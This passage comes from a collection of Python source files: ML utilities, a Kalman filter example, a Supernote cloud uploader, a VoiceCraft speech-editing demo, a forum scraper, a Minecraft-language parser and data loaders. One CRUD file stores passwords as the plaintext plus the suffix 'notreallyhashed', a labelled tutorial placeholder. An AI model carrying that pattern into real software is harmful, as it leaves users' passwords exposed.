'classifier'\n        encoder_str = 'encoder'\n    else:\n        raise NameError(\"input size does not defined!\")\n    \n    return input, classifier_str, encoder_str\n\n\ndef mac_counter(encoder, classifier, num_classes=10):\n    '''MAC operations counter'''\n    if  encoder == 'sencoder_p':\n        num_classes = 13\n    elif  encoder == 'sencoder_u' or encoder == 'sencoder_m':\n        num_classes = 6\n    Net = init_network(encoder=encoder, classifier=classifier, num_classes=num_classes, pre_trained=False)\n    input, classifier_str, encoder_str = get_input_size(encoder, classifier)\n    \n    # get flops\n    dat = get_flops_parameters(Net, input)\n    for i in range(len(dat['#flops'])):\n        dat['#flops'][i] = text_to_num(dat['#flops'][i])\n    dat['#flops'] = dat['#flops'].apply(pd.to_numeric)\n    \n    # forward MAC operation computation (1 FLOP = 2 MACs)\n    mac_fw_full = 2 * dat.loc[dat[\"module\"] == 'model']['#flops']\n    \n    mac_fw_clas = 2 * (int(dat.loc[dat[\"module\"] == classifier_str]['#flops']))\n\n    mac_fw_first = dat['#flops'][2]\n    if encoder_str is None:\n        mac_fw_encd = 2 * (mac_fw_full - mac_fw_clas)\n    else:\n        mac_fw_encd = 2 * dat.loc[dat[\"module\"] == encoder_str]['#flops']\n\n    mac_fw_encd_rest = mac_fw_encd - mac_fw_first\n\n    # backward MAC operation computation \n    # https://www.lesswrong.com/posts/fnjKpBoWJXcSDwhZk/what-s-the-backward-forward-flop-ratio-for-neural-networks\n    mac_bw_first = mac_fw_first\n    mac_bw_encd_rest = 2 * mac_fw_encd_rest\n    mac_bw_encd = mac_bw_first + mac_bw_encd_rest\n    mac_bw_clas = 2 * mac_fw_clas\n    mac_bw_full = mac_bw_encd + mac_bw_clas\n    \n    mac_fw_encd, mac_bw_encd, mac_fw_clas, m",
    "from navlie.lib import (\n    BodyFrameVelocity,\n    InvariantMeasurement,\n    Magnetometer,\n    Gravitometer,\n    SO3State,\n)\nimport navlie as nav\nfrom pymlg import SO3\nimport numpy as np\n\n\ndef main():\n    # ##########################################################################\n    # Problem Setup\n\n    # Define the initial state\n    x0 = SO3State(SO3.random(), 0.0, direction=\"left\")\n    P0 = 0.5**2 * np.identity(3)\n    Q = 0.1**2 * np.identity(3)\n    noise_active = True\n\n    # Define the process model and measurement models.\n    process_model = BodyFrameVelocity(Q)\n    mag_model = Magnetometer(0.1**2 * np.identity(3))\n    grav_model = Gravitometer(0.1**2 * np.identity(3))\n\n    # ##########################################################################\n    # Data generation\n\n    dg = nav.DataGenerator(\n        process_model,\n        lambda t, x: np.array([1, 2, 3]),\n        Q,\n        100,\n        [mag_model, grav_model],\n        1,\n    )\n    state_true, input_list, meas_list = dg.generate(x0, 0, 30, noise_active)\n\n    if noise_active:\n        x0 = x0.plus(nav.randvec(P0))\n\n    # ##########################################################################\n    # Run the regular filter\n    ekf = nav.ExtendedKalmanFilter(process_model=process_model)\n    estimate_list = nav.run_filter(ekf, x0, P0, input_list, meas_list)\n    results_ekf = nav.GaussianResultList.from_estimates(\n        estimate_list, state_true\n    )\n\n    # ##########################################################################\n    # Run the invariant filter\n    # TODO. Why does this give the exact same thing as the regular EKF?\n    # **************** Conversion to Invariant Measurements ! ******************\n    invariants = [InvariantMeasurement(meas) for meas in meas_list]\n    # **************************************************************************\n\n    ekf = nav.ExtendedKalmanFilter(process_model=process_model)\n    estimate_list = nav.run_filter(ekf, x0, P0, input_list, invariants)\n\n    results_invariant = nav.GaussianResultList.from_estimates(\n        estimate_list, state_true\n    )\n    return results_ekf, results_invariant\n\n\nif __name__ == \"__main__\":\n    results_ekf, results_invariant = main()\n    import matplotlib.pyplot as plt\n\n    fig, axs = nav.plot_error(results_ekf)\n    fig.suptitle(\"Regular EKF\")\n\n    fig, axs = nav.plot_error(results_invariant)\n    fig.suptitle(\"Invariant EKF\")\n    plt.show()\n",
    "import requests, os\nfrom hashlib import sha256, md5\n\n# thank you \n# https://github.com/adrianba/supernote-cloud-api/\n# https://github.com/colingourlay/supernote-cloud-api/\n\nAPI_BASE = \"https://cloud.supernote.com/api/\"\n\ndef _sha256_s(s):\n    return sha256(s.encode('utf-8')).hexdigest()\ndef _md5_s(s):\n    return md5(s.encode('utf-8')).hexdigest()\ndef _md5_b(b):\n    return md5(b).hexdigest()\n\ndef _post_json(path, payload, token=None):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"\n    }\n    if token is not None:\n        headers['x-access-token'] = token\n    response = requests.post(API_BASE+path, json=payload, headers=headers)\n    return response.json()\n\ndef _get_random_code(email):\n    # countrycode \n    payload = {'countryCode': \"1\", \"account\":email }\n    data = _post_json(\"official/user/query/random/code\", payload)\n    return (data['randomCode'], data['timestamp'])\n\ndef _get_access_token(email, password, rc, timestamp):\n    pd = _sha256_s(_md5_s(password) + rc);\n    payload = {'countryCode':1, 'account':email, 'password':pd, \n        'browser':'Chrome107', 'equipment':\"1\", \"loginMethod\":\"1\", \"timestamp\":timestamp, \"language\":\"en\"}\n    data = _post_json(\"official/user/account/login/new\", payload)\n    return data['token']\n\n# returns access token\ndef login(email, password):\n    (rc, timestamp) = _get_random_code(email)\n    return _get_access_token(email, password, rc, timestamp)\n\ndef file_list(token, directory=0):\n    payload = {\"directoryId\": directory, \"pageNo\":1, \"pageSize\":100, \"order\":\"time\", \"sequence\":\"desc\"}\n    data = _post_json(\"file/list/query\", payload, token=token)\n    return data['userFileVOList']\n\ndef download_file(token, id, filename=None):\n    payload = {\"id\":id, \"type\":0}\n    data = _post_json(\"file/download/url\", payload, token=token)\n    c = requests.get(data['url']).content\n    if(filename is not None):\n        f = open(filename,'wb')\n        f.write(c)\n        f.close()\n    else:\n        return c\n\ndef upload_file(token, filename, directory=0):\n    file_contents = open(filename,'rb').read()\n    data_md5 = _md5_b(file_contents)\n    payload = {'directoryId':directory, 'fileName':filename, 'md5':data_md5, 'size':len(file_contents)}\n    data = _post_json('file/upload/apply', payload, token=token)\n    if(data['success']):\n        put_headers = {'Authorization':data['s3Authorization'], 'x-amz-date':data['xamzDate'], \"x-amz-content-sha256\": \"UNSIGNED-PAYLOAD\"}\n        requests.put(data['url'], file_contents, headers=put_headers)\n        inner_name = os.path.basename(data['url'])\n        payload = {\"directoryId\":directory, \"fileName\":filename, \"fileSize\":len(file_contents), \"innerName\":inner_name,\"md5\":data_md5}\n        data = _post_json(\"file/upload/finish\", payload, token=token)\n    else:\n        print(\"Error: %s\" % (data['errorMsg']))\n\n# as an example, we download the latest NYT crossword and put it on the folder Document/puzzles\n# your auth.txt file in the current folder should have\n# username,password\n# NYT-cookie0 (load the NYT page and copy your cookies)\n# NYT-cookie1 (\"print\" a crossword and copy your cookies from that request)\nif __name__ == '__main__':\n    import nyt\n    uploaded=False\n    auth = open('auth.txt').read().split('\\n')\n    (username,password) = auth[0].split(',')\n    puzzle_fn = nyt.get(auth[1], auth[2])\n    if puzzle_fn is not None:\n        token = login(username, password)\n        if token is None:\n            print(\"Couldn't log into supernote\")\n        else:\n            for d in file_list(token):\n                if(d['isFolder']=='Y' and d['fileName']==\"Document\"): \n                    document_id = d['id']\n                    for d in file_list(token, document_id):\n                        if(d['isFolder']=='Y' and d['fileName']==\"puzzles\"): \n                            puzzles_id = d['id']\n                            upload_file(token, puzzle_fn, directory=puzzles_id)\n                            uploaded = True\n            if not uploaded:\n                print(\"Didn't upload puzzle. Check you have a puzzles folder in Document on Supernote cloud\")\n\n    else:\n        print(\"Problem downloading puzzle, bad NYT cookies?\")\n",
    "# import sys\r\n# import os\r\n\r\n# Add parent directory to the sys.path list\r\n# sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))\r\n\r\nfrom sqlalchemy.orm import Session\r\n\r\nfrom . import models, schemas\r\n\r\n\r\ndef get_user(db: Session, user_id: int):\r\n    return db.query(models.User).filter(models.User.id == user_id).first()\r\n\r\n\r\ndef get_user_by_email(db: Session, email: str):\r\n    return db.query(models.User).filter(models.User.email == email).first()\r\n\r\n\r\ndef get_users(db: Session, skip: int = 0, limit: int = 100):\r\n    return db.query(models.User).offset(skip).limit(limit).all()\r\n\r\n\r\ndef create_user(db: Session, user: schemas.UserCreate):\r\n    fake_hashed_password = user.password + \"notreallyhashed\"\r\n    db_user = models.User(email=user.email, hashed_password=fake_hashed_password)\r\n    db.add(db_user)\r\n    db.commit()\r\n    db.refresh(db_user)\r\n    return db_user\r\n\r\n\r\ndef get_items(db: Session, skip: int = 0, limit: int = 100):\r\n    return db.query(models.Item).offset(skip).limit(limit).all()\r\n\r\n\r\ndef create_user_item(db: Session, item: schemas.ItemCreate, user_id: int):\r\n    db_item = models.Item(**item.dict(), owner_id=user_id)\r\n    db.add(db_item)\r\n    db.commit()\r\n    db.refresh(db_item)\r\n    return db_item",
    "import os\nfrom phonemizer.backend.espeak.wrapper import EspeakWrapper\n\n# import libs\nimport torch\nimport torchaudio\nimport gradio as gr\nimport os\n\nfrom pydub import AudioSegment\nfrom models import voicecraft\nfrom faster_whisper import WhisperModel\n\n# configure environment variables for CUDA support\nos.environ[\"CUDA_DEVICE_ORDER\"]=\"PCI_BUS_ID\"   \nos.environ[\"CUDA_VISIBLE_DEVICES\"]=\"0\" \nos.environ[\"USER\"] = \"root\"\n\nencodec_fn = \"./encodec_4cb2048_giga.th\"\ndevice = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n\n# Load transcriber model to CPU so we don't take up VRAM\nwhisper_model = WhisperModel(\"large-v3\", device=\"cpu\", compute_type=\"int8\")\n\ncurrent_model = None\nmodel = None\nckpt = None\n\n#load tokenizers\nfrom data.tokenizer import (\n    AudioTokenizer,\n    TextTokenizer,\n)\ntext_tokenizer = TextTokenizer(backend=\"espeak\")\naudio_tokenizer = AudioTokenizer(signature=encodec_fn) # will also put the neural codec model on gpu\n\n\nfrom inference_tts_scale import inference_one_sample\n\ndef tts(original_audio, original_transcript,  target_transcript, autotranscribe=False, top_k=0, top_p=0.8, temperature=1, stop_repetition=3,inverse_offset=0, model_weight=\"830M\"):\n    global current_model\n    global model\n    global ckpt\n\n    # Load model based on config passed in; reload if changed\n    if current_model == None or current_model != f\"./giga\"+model_weight+\".pth\":\n        ckpt_fn =f\"./giga\"+model_weight+\".pth\"\n        ckpt = torch.load(ckpt_fn, map_location=\"cpu\")\n\n        model = voicecraft.VoiceCraft(ckpt[\"config\"])\n        model.load_state_dict(ckpt[\"model\"])\n        model.to(device)\n        model.eval()\n        current_model=ckpt_fn\n        print (\"Loaded and using: \"+current_model)\n\n\n    decode_config = {\n        'top_k': top_k,\n        'top_p': top_p,\n        'temperature': temperature,\n        'stop_repetition': stop_repetition, # if there are long silence in the generated audio, reduce the stop_repetition to 3, 2 or even 1\n        'kvcache': 1,\n        \"codec_audio_sr\": 16000,\n        \"codec_sr\": 50,\n        \"silence_tokens\": [1388,1898,131],\n        \"sample_batch_size\": 3 # if there are long silence or unnaturally strecthed words, increase sample_batch_size to 2, 3 or even 4\n    }\n\n    print(original_audio)\n    converted_audio = \"/tmp/input.wav\"\n\n    sound = AudioSegment.from_mp3(original_audio)\n    sound.export(converted_audio, format=\"wav\")\n\n    # if Autotranscribe is set, use whisper to create the input transcription instead of using the provided value\n    if autotranscribe:\n        segments, info = whisper_model.transcribe(converted_audio, initial_prompt=\"here we go umm, uhm, yeaah. Okay, ehm, uuuh.\", beam_size=5)\n        full_text = \"\"\n\n        for segment in segments:\n            full_text += segment.text\n\n        global original_transcript_input \n        original_transcript = full_text\n        print(full_text)\n\n    target_transcript = original_transcript + target_transcript\n    info = torchaudio.info(converted_audio)\n    cut_off_sec = info.num_frames / info.sample_rate\n    audio_dur = info.num_frames / info.sample_rate\n    assert cut_off_sec <= audio_dur, f\"cut_off_sec {cut_off_sec} is larger than the audio duration {audio_dur}\"\n    prompt_end_frame = int(cut_off_sec * info.sample_rate) - int(inverse_offset)\n    print(f\"prompt_end_frame:\",prompt_end_frame)\n    _, gen_audio = inference_one_sample(model, ckpt[\"config\"], ckpt['phn2num'], text_tokenizer, audio_tokenizer, converted_audio, target_transcript, device, decode_config, prompt_end_frame)\n    gen_audio = gen_audio[0].cpu()\n    torchaudio.save(f\"gen.wav\", gen_audio, 16000)\n    return \"gen.wav\", original_transcript\n\n\nwith gr.Blocks() as demo:\n    gr.Markdown(\"# Dockerized Voicecraft: Zero-Shot Speech Editing and Text-to-Speech in the Wild\")\n    with gr.Row():\n        input_audio = gr.Audio(label=\"Original Audio\", type=\"filepath\")\n        autotranscribe_input = gr.Checkbox(value=True,label=\"Autotranscribe input\")\n\n    original_transcript_input = gr.Textbox(label=\"Uploaded Audio Transcript\")\n    new_transcript_input = gr.Textbox(label=\"What would you like to say?\")\n\n    with gr.Row():\n        with gr.Accordion(\"Advanced configuration\", open=False):\n            top_k_input = gr.Number(label=\"Top K\", value=0, precision=0)\n            top_p_input = gr.Slider(label=\"Top P\", value=0.8, minimum=0.1, maximum=1.0, step=0.05)\n            temperature_input = gr.Number(label=\"Temperature\", value=1)\n            stop_word_count_input = gr.Number(label=\"Stop Word Count\", value=3)\n            inverse_offset_input = gr.Number(label=\"Inverse Offset\", value=0)\n            model_input = gr.Radio(label=\"Select Option\", choices=[\"330M\", \"830M\"], value=\"830M\")\n    btn = gr.Button(\"Run\")\n\n    with gr.Row():\n        output_audio = gr.Audio(label=\"Generated Audio\", type=\"filepath\", autoplay=True)\n    btn.click(fn=tts, inputs=[input_audio, original_transcript_input, new_transcript_input, autotranscribe_input, top_k_input, top_p_input, temperature_input, stop_word_count_input, inverse",
    "import requests\nimport html\nimport re\n\ndef download_dat(url):\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        return response.text\n    except requests.RequestException as e:\n        print(f\"\u8bf7\u6c42\u9519\u8bef: {e}\")\n        return None\n    \ndef format_post(raw_text):\n    floors = re.split(r'\u540d\u7121\u3057\u3055\u3093', raw_text)[1:] \n    extracted_content = []\n    for index, floor in enumerate(floors):\n        author_match = re.search(r'ID:([^\\s<>]+)', floor)\n        author = author_match.group(1) if author_match else ''\n        \n        resto_match = re.search(r'&gt;&gt;(\\d+)<br>', floor)\n        resto = resto_match.group(1) if resto_match else ''\n\n        content_start = floor.find(f\"ID:{author}<>\") + len(f\"ID:{author}<>\")\n        content_end = floor.rfind(\"<>\")\n        content = floor[content_start:content_end]\n        \n        content = re.sub(r'&gt;&gt;\\d+<br>', '', content)\n        content = content.replace('<br>', '\\n')\n        com = html.unescape(content.strip())\n\n        extracted_content.append(f\"No:{index+1},Author:{author},Reply:{resto},Msg:{com}\")\n    \n    return '\\n'.join(extracted_content)  # \u8fd4\u56de\u6240\u6709\u697c\u5c42\u5185\u5bb9\u7684\u957f\u5b57\u7b26\u4e32\n\ndef five_chan_scraper(sever,board,thread_id):\n    if 'jpnkn' in sever:\n        url = f\"https://{sever}/{board}/dat/{thread_id}.dat\"\n    elif '5ch' in sever:\n        url = f\"https://{sever}/{board}/oyster/{thread_id[0:4]}/{thread_id}.dat\"\n    else:\n        print(\"\u672a\u77e5\u7684\u670d\u52a1\u5668\u3002\")\n        return\n    print(f\"\u6b63\u5728\u4e0b\u8f7d{url}\")\n    post = download_dat(url)\n    extracted_content = format_post(post)\n    return extracted_content\n\n# \u4f7f\u7528\u6848\u4f8b\n# print(five_chan_scraper('bbs.jpnkn.com','hololiveneet', '1711709496'))",
    "\r\nimport tokenize\r\nfrom anytree import Node, RenderTree\r\nimport os\r\nimport string\r\nimport shutil\r\nimport json\r\n\r\nfrom tkinter import *\r\nfrom tkinter import filedialog\r\nfrom tkinter import messagebox\r\n\r\n\r\n\r\n\r\n\r\n#######################################\r\n# CONSTANTS\r\n#######################################\r\n\r\nDIGITS = '0123456789'\r\nLETTERS = string.ascii_letters\r\nLETTERS_DIGITS = LETTERS + DIGITS\r\nMINECRAFT_SELECTOR = \"parse\"\r\n\r\nMINECRAFTCOMMAND = \"/\"\r\nTERM = (\"*\", \"/\", \"%\")\r\nFACTOR = (\"+\", \"-\")\r\nBASIC_OPERATOR = FACTOR + TERM + (\"=\", \"==\", \"!=\", \">\", \"<\", \">=\", \"<=\", \".\")\r\nLOGIC_OPERATOR = (\"==\", \"!=\", \"!\", \">\", \">=\", \"<\", \"<=\")\r\nSCORE_TYPES = (\"int\", \"float\", \"double\", \"bool\")\r\nTYPES = (\"entity\", \"nbt\", \"string\") + SCORE_TYPES\r\nMEANS_END = (\";\", \"]\", \"}\")\r\nSCOREBOARD_NAME = \"40planet_num\"\r\nSTORAGE_NAME = \"40planet:value\"\r\n\r\nKEYWORDS = ( \"if\", \"else\", \"while\", \"import\", \"def\", \"break\", \"and\", \"or\", \"return\", \"execute\" ) + TYPES\r\n\r\nOPERATOR_TO_STRING = {\r\n    \"=\":\"equal\",\r\n    \"+\":\"basic\",\r\n    \"-\":\"basic\",\r\n    \"*\":\"basic\",\r\n    \"/\":\"basic\",\r\n    \"%\":\"basic\",\r\n    \"return\": \"return\",\r\n    \"==\": \"bool\",\r\n    \"!=\": \"bool\",\r\n    \">=\": \"bool\",\r\n    \"<=\": \"bool\",\r\n    \"<\": \"bool\",\r\n    \">\": \"bool\",\r\n    \".\":\"dot\",\r\n    \"[\":\"big_paren\",\r\n    \"(\":\"small_paren\",\r\n    \"{\":\"nbt\",\r\n    \"@\": \"entity\",\r\n    \"and\": \"and_or\",\r\n    \"or\": \"and_or\",\r\n    \"member\":\"member\",\r\n    \"!\":\"not\",\r\n    \"dot\": \"dot\"\r\n}\r\n\r\nOPERATOR_PRIORITY = {\r\n    \"=\":0,\r\n    \"return\": 0,\r\n    \"and\":2,\r\n    \"or\":2,\r\n    \"!\":2,\r\n    \"==\":3,\r\n    \"!=\":3,\r\n    \">\":3,\r\n    \"<\":3,\r\n    \">=\":3,\r\n    \"<=\":3,\r\n    \"+\":4,\r\n    \"-\":4,\r\n    \"*\":5,\r\n    \"/\":5,\r\n    \"%\":5,\r\n    \"member\":6,\r\n    \"dot\":6,\r\n    \"paren\":100\r\n}\r\n\r\nINTERPRETE_THESE = (\"operator\", \"call_function\", \"make_array\", \"make_nbt\", \"make_selector\", \"define_var\", \"define_array\")\r\n\r\nBUILT_IN_FUNCTION = (\"print\", \"random\", \"type\", \"round\", \"get_score\", \"get_data\", \"set_score\") + TYPES\r\n\r\nEXECUTE_KEYWORDS = ( \"as\", \"at\", \"if\", \"positioned\", \"\" )\r\n\r\nMINECRAFT_TYPES = (\"byte\", \"short\", \"int\", \"float\", \"double\", \"long\")\r\n#######################################\r\n# ERRORS\r\n#######################################\r\n\r\nclass Error:\r\n    def __init__(self, token, error_name, filename, details):\r\n        self.token = token\r\n        self.error_name = error_name\r\n        self.details = details\r\n        self.filename = filename\r\n  \r\n    def as_string(self):\r\n        result  = f'{self.error_name}: {self.details}\\n'\r\n        result += f'File {self.filename}, line {self.token.start[0]}'\r\n        result += \"\\n\\n\" + self.token.line\r\n        if self.token.line[-1] != \"\\n\": result += \"\\n\"\r\n        result += \" \" * self.token.start[1]\r\n        result += \"^\" * (self.token.end[1] - self.token.start[1])\r\n        return result\r\n\r\nclass InvalidSyntaxError(Error):\r\n    def __init__(self, token, filename, details=''):\r\n        super().__init__(token, 'Invalid Syntax', filename, details)\r\n\r\n#######################################\r\n# PARSER\r\n#######################################\r\n\r\nclass Parser:\r\n    def __init__(self, tokens, filename):\r\n        self.tokens = tokens\r\n        self.filename = filename\r\n        self.tok_idx = -1\r\n        self.advance()\r\n        self.variables = {}\r\n        self.functions = {}\r\n\r\n    def advance(self):\r\n        self.tok_idx += 1\r\n        self.update_current_tok()\r\n        return self.current_tok\r\n\r\n    def reverse(self, amount=1):\r\n        self.tok_idx -= amount\r\n        self.update_current_tok()\r\n        return self.current_tok\r\n\r\n    def update_current_tok(self):\r\n        if self.tok_idx >= 0 and self.tok_idx < len(self.tokens):\r\n            self.current_tok = self.tokens[self.tok_idx]\r\n\r\n    def parse(self):\r\n    \r\n        root = Node(\"root\", token = None)\r\n\r\n        while self.current_tok.type != 0:\r\n            node, error = self.build_ast(root)\r\n            if error: return root, error\r\n\r\n            self.advance()\r\n\r\n        return root, None\r\n    def build_ast(self, parent): # \ud604\uc7ac \ud1a0\ud070\uc744 ast\ub85c \ubcc0\ud658\ud558\uc5ec parent \ub178\ub4dc\uc5d0 \uc790\uc2dd\uc73c\ub85c \ucd94\uac00\uc2dc\ucf1c\ub77c\r\n        if self.current_tok.type == 64: return Node(\"comment\", token=self.current_tok), None\r\n        elif self.current_tok.type == 5: return Node(\"indent\", token=self.current_tok), None\r\n        method_name = f'type_{self.current_tok.type}'\r\n        method = getattr(self, method_name)\r\n        node, error = method(parent)\r\n        if error: return node, error\r\n        if node.name != \"new_line\": node.parent = parent\r\n        return node, None\r\n  \r\n    def type_1(self, parent): # NAME type\r\n        if len(parent.children) > 0 and parent.children[0].name == \"dot\":\r\n            tok = self.advance()\r\n            self.reverse()\r\n            if tok.string == \"(\":\r\n                return self.make_tree_of_call_function()\r\n            else: return Node(self.current_tok.string, token = self.current_tok), None\r\n        elif self.current_tok.string in KEYWORDS:\r\n            error = None\r\n            if self.current_tok.string in TYPES:\r\n                node, error = self.define_var()\r\n      ",
    "#!/usr/bin/env python\r\n# encoding: utf-8\r\n\"\"\"\r\n@author: Tong Wu\r\n@contact: wu_tong@sjtu.edu.cn\r\n@file:file\r\n@time: time\r\n\"\"\"\r\n\r\nimport os\r\n\r\nimport numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nimport matplotlib.pyplot as plt\r\n#import pandas as pd\r\n# from Diffusion.Autoencoder import noise_encoder\r\nfrom torch.autograd import Variable\r\nfrom torchvision.utils import save_image\r\nimport pymongo\r\n\r\ndef extract(v, t, x_shape):\r\n    \"\"\"\r\n    Extract some coefficients at specified timesteps, then reshape to\r\n    [batch_size, 1, 1, 1, 1, ...] for broadcasting purposes.\r\n    \"\"\"\r\n    device = t.device\r\n    out = torch.gather(v, index=t, dim=0).float().to(device)\r\n    return out.view([t.shape[0]] + [1] * (len(x_shape) - 1))\r\n\r\n\r\nclass GaussianDiffusionSampler(nn.Module):\r\n    def __init__(self, model, beta_1, beta_T, T):\r\n        super().__init__()\r\n\r\n        self.model = model\r\n        self.T = T\r\n\r\n        # self.AE.train()\r\n\r\n        # self.SNR = torch.linspace(beta_1, beta_T, T)\r\n        # self.betas = 10 ** (-self.SNR / 10.)\r\n        # self.sqrt_betas=torch.sqrt(self.betas)\r\n        # self.SNR = -10 * torch.log10(self.betas)\r\n        self.register_buffer('betas', torch.linspace(beta_1, beta_T, T).double())\r\n\r\n        alphas = 1. - self.betas\r\n        self.alphas_bar = torch.cumprod(alphas, dim=0)\r\n        self.alphas_bar_prev = F.pad(self.alphas_bar, [1, 0], value=1)[:T]\r\n        #self.sqrt_alphas_bar = torch.sqrt(self.alphas_bar)\r\n        self.sqrt_one_minus_alphas_bar = torch.sqrt(1. - self.alphas_bar)\r\n        self.pow = self.alphas_bar / (1. - self.alphas_bar)\r\n        self.register_buffer(\r\n            'sqrt_alphas_bar', torch.sqrt(self.alphas_bar))\r\n        #self.register_buffer(\r\n        #     'sqrt_one_minus_alphas_bar', torch.sqrt(1. - self.alphas_bar))\r\n        self.register_buffer('SNR',(1-self.alphas_bar)/self.alphas_bar)\r\n\r\n        self.register_buffer('coeff1', torch.sqrt(1. / alphas))\r\n        self.register_buffer('coeff2', self.coeff1 * (1. - alphas) / torch.sqrt(1. - self.alphas_bar))\r\n        self.register_buffer('coeff3', self.coeff1 * (1. - alphas))\r\n\r\n        self.register_buffer('posterior_var', self.betas * (1. - self.alphas_bar_prev) / (1. - self.alphas_bar))\r\n        self.register_buffer('sigma_eps',(alphas-torch.sqrt(alphas-self.alphas_bar))/(torch.sqrt(1-self.alphas_bar)-torch.sqrt(alphas-self.alphas_bar)))\r\n\r\n# sampler = GaussianDiffusionSampler(model=1, beta_1=1e-4, beta_T=0.02, T=1000)\r\n# #data=pd.read_csv(r\"E:\\code\\DDPM\\semdif\\CDESC_sigma_eps_rayleigh_decoderSNR5.csv\")\r\n# #print(sampler.SNR)\r\n# #plt.plot(sampler.sigma_eps)\r\n# #plt.show()\r\n# sigma_eps=[]\r\n# for i in range(999):\r\n#     t=i+1\r\n#     x=1-sampler.alphas_bar[t-1]-torch.sqrt(1/(1-sampler.betas[t])-sampler.alphas_bar[t-1])\r\n#     y=(1-sampler.alphas_bar[t])-torch.sqrt((1-sampler.alphas_bar[t-1])*(1-sampler.alphas_bar[t])/(1-sampler.betas[t]))\r\n#     sigma_eps.append(y/x)\r\n# plt.plot(sigma_eps)\r\n# plt.show()\r\n#120*5 -- 1\r\n#124*5 -- 0.5\r\n# print(sampler.betas)\r\nmycilent = pymongo.MongoClient(\"mongodb://localhost:27017\")\r\nprint(mycilent)\r\nmydb = mycilent[\"test\"]\r\nmycol=mydb[\"test_col\"]\r\nmydic={'1':3}\r\nmycol.insert_one(mydic)\r\n\r\n#print(list(mycol.find({})[0]))\r\n\r\n",
    "from deffer import *\n\ndef delete_folder_files(folder):\n    if(folder=='pictures'):\n        delete_files_in_folder('pictures')\n    if(folder=='video'):\n        delete_files_in_folder('video')\n    if(folder=='split_txt'):\n        delete_files_in_folder('split_txt')\n    if(folder=='tts'):\n        delete_files_in_folder('tts')\n\n\n# delete_file('output.mp4')\n\n\n\ndef make_text():\n    spliter(get_whole_file('content.txt'))\n\n    print(\"*\"*50)\n    print(\"\u5b8c\u6210\uff01\")\n\ndef make_tts():\n    contents=loadtxt()\n    contents_double=dozen_txt_double(contents)\n    text_to_voice(contents_double)\n    print(\"*\"*50)\n    print(\"\u5b8c\u6210\uff01\")\n\ndef make_pic():\n    contents=loadtxt()\n    text_to_pic(use_extract_keywords(translate((contents))))\n\n    print(\"*\"*50)\n    print(\"\u5b8c\u6210\uff01\")\n\n\ndef make_movie():\n    handle_movie(load_voice(),double_txt(loadtxt()))\n    print(\"*\"*50)\n    print(\"\u5b8c\u6210\uff01\")\n\n\ndef re_make_pic(num):\n    prom=''\n    re_create_pic(num,prom)\n\n    print(\"*\"*50)\n    print(\"\u5b8c\u6210\uff01\")\n\n\n\n\n\n# # # \u4e00\u7ef4\u7247\u6bb5\n# contents=spliter(clip_to_whole(get_whole_file('content.txt')))\n# # # \u5bf9\u6bcf\u4e2a\u7ef4\u5ea6\u751f\u6210\u7167\u7247\n# text_to_pic((use_extract_keywords(translate((contents)))))\n# # # \u62c6\u5206\u4e3a\u4e8c\u7ef4\u7247\u6bb5\uff0c\u5bf9\u6bcf\u4e00\u4e2a\u7247\u6bb5\u8fdb\u884c\u5185\u90e8\u62c6\u5206,\u4e00\u7ef4\u53d8\u4e8c\u7ef4\uff0c\u65b9\u4fbf\u8bed\u97f3\u751f\u6210\u548c\u6587\u5b57\u914d\n# contents_double=choose_and_use_split_func(contents)\n# # # \u8f6c\u8bed\u97f3\n# voice=text_to_voice(contents_double)\n# # # \u8f93\u51fa\u4e3a\u89c6\u9891\n# handle_movie(load_voice(),contents_double)\n\n\n\n",
    "\nimport pandas as pd\nimport json\n\nclass Saver:\n    def __init__(\n        self,\n        output_file,\n        output_keys=None,\n        format=None,\n        save_every=None\n    ):\n        self.output_file = output_file\n        self.output_keys = output_keys\n        self.format = format\n        self.save_every = save_every\n\n        if format is None:\n            # take the format from the file extension\n            self.format = self.output_file.split(\".\")[-1]\n\n    def save(self, results):\n        match self.format:\n            case \"csv\":\n                self.save_csv(results)\n            case \"jsonl\":\n                self.save_jsonl(results)\n            case _:\n                raise ValueError(f\"Unsupported format: {self.format}\")\n\n    def save_jsonl(self, results):\n        print(f\"Saving {len(results)} results to {self.output_file}\")\n        with open(self.output_file, \"w\") as f:\n            for result in results:\n                # sort by keys for consistent output\n                result = {k: result[k] for k in self.output_keys if k in result}\n                f.write(json.dumps(result) + \"\\n\")\n\n    def save_csv(self, results):\n        print(f\"Saving {len(results)} results to {self.output_file}\")\n        df = pd.DataFrame(results)\n\n        # Select only the output keys specified in their order\n        if self.output_keys is not None:\n            df = df[self.output_keys]\n\n        df.to_csv(self.output_file, index=False)\n\n",
    "import io\nimport os\nimport pandas as pd\nimport requests\nimport zipfile\nimport tempfile\nimport logging\n\n# Set up logging\nlogging.basicConfig(filename='data_loader.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n\nif 'data_loader' not in globals():\n    from mage_ai.data_preparation.decorators import data_loader\nif 'test' not in globals():\n    from mage_ai.data_preparation.decorators import test\n\n\n@data_loader\ndef load_data_from_api(*args, **kwargs):\n    \"\"\"\n    Template for loading data from API\n    \"\"\"\n\n    # URL of the zip file\n    #url = 'https://drive.google.com/file/d/1-Ibjb4zcowQDu1JcmHoSS3SMmr50qd5m/view?usp=sharing'\n\n    # Directory for saving the downloaded zip file\n    project_file = './data-source/'\n    project_file_out = './data-source/archive'\n    project_dir = os.path.abspath(project_file)\n    data_source_dir = os.path.join(project_dir, 'data-source')\n    archive_zip = os.path.join(data_source_dir, 'archive.zip')\n\n    # Ensure the directory exists, create if it doesn't\n    os.makedirs(data_source_dir, exist_ok=True)\n    \n    # Extract zip file\n    with zipfile.ZipFile(archive_zip) as zip_file:\n        for member in zip_file.infolist():\n            extracted_file_path = os.path.join(project_file_out, member.filename)\n            logging.info(f'Extracting {extracted_file_path}...')  # Log the extraction process\n            zip_file.extract(member, path=project_file_out)\n    \n    return project_file_out\n\n\n@test\ndef test_output(output, *args) -> None:\n    \"\"\"\n    Template code for testing the output of the block.\n    \"\"\"\n    assert output is not None, 'The output is undefined'\n    logging.info('Test output successful')  # Log successful test output\n",
